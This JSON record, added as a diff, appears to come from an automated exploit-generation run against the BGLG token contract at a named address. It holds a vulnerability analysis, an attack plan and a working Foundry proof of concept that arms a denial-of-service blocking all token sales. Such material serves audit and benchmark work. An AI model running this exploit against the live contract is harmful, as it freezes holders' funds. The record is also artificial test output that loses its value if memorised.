@@ -1,0 +1,61 @@
+{
+  "project_id": "Big League Smart Contract Audit Report - QuillAudits",
+  "target_address": "0xEa01D8D9EaCCa9996Db6Bb3377c1Fe64308e7328",
+  "finding_id": 1,
+  "status": "SUCCESS",
+  "violation_target": {
+    "target_address": "0xEa01D8D9EaCCa9996Db6Bb3377c1Fe64308e7328",
+    "vulnerability_type": "Denial of Service via Flawed Liquidity Logic",
+    "violation_category": "LOGIC",
+    "finding_id": 1,
+    "preconditions": [
+      {
+        "type": "token_balance",
+        "description": "Attacker must possess enough BGLG tokens to transfer to the contract to surpass its swap threshold.",
+        "token_address": "0xEa01D8D9EaCCa9996Db6Bb3377c1Fe64308e7328",
+        "min_amount": "12500000000000000000001"
+      },
+      {
+        "type": "state",
+        "description": "The contract's liquidity fee must be zero, which is the default state.",
+        "token_address": null,
+        "min_amount": null
+      }
+    ],
+    "oracle_verification": {
+      "economic_check": null,
+      "logic_check": {
+        "target_variable": "balanceOf(0xea01d8d9eacca9996db6bb3377c1fe64308e7328)",
+        "operator": ">",
+        "expected_value": "12500000000000000000000"
+      }
+    },
+    "exploit_hint": "The contract's `_sellAndDistributeAccumulatedTKNFee` function is flawed. When triggered, it attempts to add liquidity via `addLiquidityETH` with a non-zero amount of BNB but zero tokens, because `fees.liquidity` is 0. This call is guaranteed to revert, causing any transaction that triggers it (i.e., a token sale) to fail. The exploit is to 'arm' this Denial of Service condition. First, calculate the token threshold that triggers the function: `(totalSupply * _SWAPBACK_THRESHOLD[0]) / _SWAPBACK_THRESHOLD[1]`. Then, directly transfer an amount of tokens greater than this threshold to the contract address itself. This action will succeed and put the contract in a state where any subsequent attempt by any user to sell the token will fail."
+  },
+  "final_poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface StandardToken {\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function totalSupply() external view returns (uint256);\n    function _SWAPBACK_THRESHOLD(uint256 index) external view returns (uint256);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0xEa01D8D9EaCCa9996Db6Bb3377c1Fe64308e7328;\n    address attacker = address(this);\n    StandardToken public token;\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        token = StandardToken(TARGET);\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n\n        uint256 thresholdNumerator = token._SWAPBACK_THRESHOLD(0);\n        uint256 thresholdDenominator = token._SWAPBACK_THRESHOLD(1);\n        uint256 swapThreshold = (token.totalSupply() * thresholdNumerator) / thresholdDenominator;\n        \n        // The amount needed to trigger the vulnerability.\n        // We send slightly more to be safe and pass the oracle.\n        uint256 amountToTransfer = swapThreshold + 1;\n        \n        // Give the attacker the required tokens.\n        deal(TARGET, attacker, amountToTransfer);\n        \n        // Transfer tokens to the contract to 'arm' the DoS.\n        // This increases the contract's own token balance above the threshold.\n        token.transfer(TARGET, amountToTransfer);\n        \n        // The oracle will now check that balanceOf(TARGET) is greater than the original threshold,\n        // confirming the contract is in the DoS state.\n        assertGt(token.balanceOf(0xEa01D8D9EaCCa9996Db6Bb3377c1Fe64308e7328), 12500000000000000000000, \"Logic Exploit Failed\");\n    }\n\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+  "attempts": [
+    {
+      "attempt_number": 1,
+      "vulnerability_analysis": "The vulnerability lies in the `_sellAndDistributeAccumulatedTKNFee` function. When triggered, it attempts to add liquidity to a DEX pair. However, due to the default fee settings where `fees.liquidity` is 0, the function calculates a zero token amount (`TKNtoLiquidity`) to add. After swapping some tokens for BNB, it calls `router.addLiquidityETH` with a non-zero BNB amount but a zero token amount. This call is guaranteed to revert on standard DEX routers, causing any transaction that triggers this function (like a token sale) to fail. This creates a Denial of Service vulnerability.",
+      "attack_strategy": "The attack strategy is to 'arm' the Denial of Service condition. The vulnerable function, `_sellAndDistributeAccumulatedTKNFee`, is only triggered if the contract's own token balance exceeds a specific threshold, calculated as `(totalSupply * _SWAPBACK_THRESHOLD[0]) / _SWAPBACK_THRESHOLD[1]`. The exploit involves first calculating this threshold amount. Then, the attacker obtains an amount of tokens just exceeding this threshold and transfers them directly to the contract address. This action sets the contract's token balance above the threshold, ensuring that any subsequent token sale by any user will trigger the flawed logic and revert, effectively freezing all sales.",
+      "step_by_step_plan": "1. Instantiate the target contract interface. 2. Read the `totalSupply` and the `_SWAPBACK_THRESHOLD` array elements from the contract using their public getters. 3. Calculate the swapback threshold amount. 4. Use `deal()` to grant the attacker contract an amount of tokens slightly greater than the calculated threshold. 5. Call the `transfer()` function on the token contract to send these tokens to the token contract itself (`TARGET` address). 6. This action increases the `balanceOf(TARGET)` to a value that satisfies the oracle's check, successfully demonstrating the setup for the DoS.",
+      "failure_reflection": "",
+      "action": "write_poc",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface StandardToken {\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function totalSupply() external view returns (uint256);\n    function _SWAPBACK_THRESHOLD(uint256 index) external view returns (uint256);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0xEa01D8D9EaCCa9996Db6Bb3377c1Fe64308e7328;\n    address attacker = address(this);\n    StandardToken public token;\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        token = StandardToken(TARGET);\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n\n        uint256 thresholdNumerator = token._SWAPBACK_THRESHOLD(0);\n        uint256 thresholdDenominator = token._SWAPBACK_THRESHOLD(1);\n        uint256 swapThreshold = (token.totalSupply() * thresholdNumerator) / thresholdDenominator;\n        \n        // The amount needed to trigger the vulnerability.\n        // We send slightly more to be safe and pass the oracle.\n        uint256 amountToTransfer = swapThreshold + 1;\n        \n        // Give the attacker the required tokens.\n        deal(TARGET, attacker, amountToTransfer);\n        \n        // Transfer tokens to the contract to 'arm' the DoS.\n        // This increases the contract's own token balance above the threshold.\n        token.transfer(TARGET, amountToTransfer);\n        \n        // The oracle will now check that balanceOf(TARGET) is greater than the original threshold,\n        // confirming the contract is in the DoS state.\n        assertGt(token.balanceOf(0xEa01D8D9EaCCa9996Db6Bb3377c1Fe64308e7328), 12500000000000000000000, \"Logic Exploit Failed\");\n    }\n\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 0,
+      "error": null,
+      "feedback": null,
+      "duration_seconds": 72.16095113754272,
+      "prompt_tokens": 10532,
+      "completion_tokens": 6191,
+      "total_cost": 0.0
+    }
+  ],
+  "total_attempts": 1,
+  "error_message": null,
+  "total_duration_seconds": 72.16378903388977,
+  "total_prompt_tokens": 10532,
+  "total_completion_tokens": 6191,
+  "total_cost": 0.0
+}
